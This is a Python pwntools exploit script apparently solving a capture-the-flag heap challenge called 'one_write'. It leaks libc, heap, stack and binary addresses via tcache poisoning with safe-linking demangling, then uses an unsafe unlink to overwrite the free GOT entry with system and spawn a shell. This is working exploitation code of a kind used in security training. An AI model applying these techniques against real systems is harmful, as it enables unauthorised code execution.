#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './one_write_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set resolve-heap-via-heuristic force
    set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1447)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='one_write')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def alloc(idx, size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendlineafter(b'size: ', str(size).encode())

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())

def write(data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'data: ', data)

def view():
    io.sendlineafter(b'> ', b'4')

def exploit():
    # Zafir's Solution
    global io
    io = initialize()
    with log.progress("Leak libc & heap address"), context.silent:
        alloc(0, 0x418)
        alloc(1, 0x418)
        alloc(2, 0x108)
        free(0)
        alloc(3, 0x48)
        alloc(4, 0x48)
        alloc(5, 0x48)
        alloc(6, 0x48)
        alloc(7, 0x48)
        alloc(8, 0x48)
        view()
        libc_leak = u64(io.recv(8).ljust(8, b'\x00'))
        io.recv(8)
        heap = (u64(io.recv(8).ljust(8, b'\x00')) >> 12) << 12
        libc.address = libc_leak - 0x203f10

    log.info('Libc leak: %#x', libc_leak)
    log.info('Libc base: %#x', libc.address)
    log.info('Heap base: %#x', heap)
    with log.progress("Leak stack address"), context.silent:
        free(5)
        free(4)
        free(3)
        write(p64(mangle(heap,libc.bss())))
        alloc(9, 0x48)
        alloc(10, 0x48)
        free(6)
        view()
        io.recvuntil(p64(0x51))
        io.recvuntil(p64(0x51))
        io.recvuntil(p64(0x51))
        stack_leak = u64(io.recv(8).ljust(8, b'\x00')) ^ (libc.bss() >> 12) ^ (heap >> 12) #Since it mangle 2 times to demangle it
        stack_target = stack_leak - 0x48
    log.info('Stack leak: %#x', stack_leak)

    with log.progress("Leak ELF address"), context.silent:
        free(7)
        write((b"\x00"*0x48 + p64(0x51))*4 + p64(mangle(heap,stack_target)))
        alloc(11, 0x40)
        alloc(12, 0x40)
        free(8)
        view()
        for _ in range(5):
            io.recvuntil(p64(0x51))
        elf_leak = u64(io.recv(8).ljust(8, b'\x00')) ^ (stack_target >> 12) ^ (heap >> 12) #Since it mangle 2 times to demangle it
        elf.address = elf_leak - elf.sym["_start"]
        alloc(13, 0x238) # Clean bins
    
    log.info('Elf leak: %#x', elf_leak)
    log.info("Elf base: %#x", elf.address)
    with log.progress("Get shell with unsafe unlink via Free GOT"), context.silent:
        write(p64(0) + p64(0x411) + p64(elf.sym["the_chunk"]-0x18) + p64(elf.sym["the_chunk"]-0x10) + b"\0"*0x3f0 + p64(0x410) + p64(0x420)) # Make fake chunk & Change the prev size
        free(1) # Free the chunk that gonna merge
        write(b"/bin/sh\0"*3 + p64(elf.got["free"])*4 + p64(elf.sym["the_chunk"]-0x18)) #Change pointer to Free got
        write(p64(libc.sym["system"])) #Overwrite free_got
        free(0)
    io.interactive()

if __name__ == '__main__':
    exploit()
